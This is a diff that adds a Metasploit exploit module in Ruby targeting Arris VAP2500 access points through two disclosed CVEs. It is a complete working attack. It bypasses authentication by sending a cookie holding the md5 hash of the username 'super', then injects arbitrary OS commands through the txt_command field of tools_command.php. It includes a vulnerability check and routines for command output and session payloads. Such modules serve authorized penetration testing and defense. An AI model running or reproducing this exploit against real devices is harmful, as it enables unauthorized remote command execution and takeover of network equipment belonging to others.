@@ -1,0 +1,132 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'        => 'Arris VAP2500 tools_command.php Command Execution',
+      'Description' => %q{
+        Arris VAP2500 access points are vulnerable to OS command injection in the web management
+        portal via the tools_command.php page. Though authentication is required to access this
+        page, it is trivially bypassed by setting the value of a cookie to an md5 hash of a valid
+        username.
+      },
+      'Author'      =>
+        [
+          'HeadlessZeke' # Vulnerability discovery and Metasploit module
+        ],
+      'License'     => MSF_LICENSE,
+      'References'  =>
+        [
+          ['CVE', '2014-8423'],
+          ['CVE', '2014-8424'],
+          ['OSVDB', '115045'],
+          ['OSVDB', '115046'],
+          ['BID', '71297'],
+          ['BID', '71299'],
+          ['URL', 'http://goto.fail/blog/2014/11/25/at-and-t-u-verse-vap2500-the-passwords-they-do-nothing/']
+        ],
+      'DisclosureDate' => 'Nov 25 2014',
+      'Privileged'     => true,
+      'Payload'        =>
+        {
+          'DisableNops' => true,
+          'Space'       => 1024,
+          'Compat'      =>
+            {
+              'PayloadType' => 'cmd',
+              'RequiredCmd' => 'generic telnet'
+            }
+        },
+      'Platform'       => 'unix',
+      'Arch'           => ARCH_CMD,
+      'Targets'        => [[ 'Automatic', { }]],
+      'DefaultTarget' => 0
+      ))
+  end
+
+  def check
+    begin
+      res = send_request_raw({
+        'method' => 'GET',
+        'uri' => '/tools_command.php',
+        'cookie' => "p=#{Rex::Text.md5('super')}"
+      })
+      if res && res.code == 200 && res.body.to_s =~ /TOOLS - COMMAND/
+        return Exploit::CheckCode::Vulnerable
+      end
+    rescue ::Rex::ConnectionError
+      return Exploit::CheckCode::Unknown
+    end
+
+    Exploit::CheckCode::Safe
+  end
+
+  def exploit
+    print_status("Trying to access the device ...")
+
+    unless check == Exploit::CheckCode::Vulnerable
+      fail_with(Failure::NotVulnerable, "#{peer} - Failed to access the vulnerable device")
+    end
+
+    print_status("Exploiting...")
+
+    if datastore['PAYLOAD'] == 'cmd/unix/generic'
+      exploit_cmd
+    else
+      exploit_session
+    end
+  end
+
+  def exploit_cmd
+    beg_boundary = rand_text_alpha(8)
+    end_boundary = rand_text_alpha(8)
+
+    begin
+      res = send_request_cgi({
+        'uri'    => normalize_uri('/', 'tools_command.php'),
+        'vars_post' => {
+          'cmb_header'  => '',
+          'txt_command' => "echo #{beg_boundary}; #{payload.encoded}; echo #{end_boundary}"
+        },
+        'method' => 'POST',
+        'cookie' => "p=#{Rex::Text.md5('super')}"
+      })
+
+      if res && res.code == 200 && res.body.to_s =~ /TOOLS - COMMAND/
+        print_good("Command sent successfully")
+        if res.body.to_s =~ /#{beg_boundary}(.*)#{end_boundary}/m
+          print_status("Command output: #{$1}")
+        end
+      else
+        fail_with(Failure::UnexpectedReply, "#{peer} - Command execution failed")
+      end
+    rescue ::Rex::ConnectionError
+      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
+    end
+  end
+
+  def exploit_session
+    begin
+      send_request_cgi({
+        'uri'    => normalize_uri('/', 'tools_command.php'),
+        'vars_post' => {
+         'cmb_header'  => '',
+         'txt_command' => "#{payload.encoded}"
+        },
+        'method' => 'POST',
+        'cookie' => "p=#{Rex::Text.md5('super')}"
+      }, 3)
+    rescue ::Rex::ConnectionError
+      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
+    end
+  end
+end
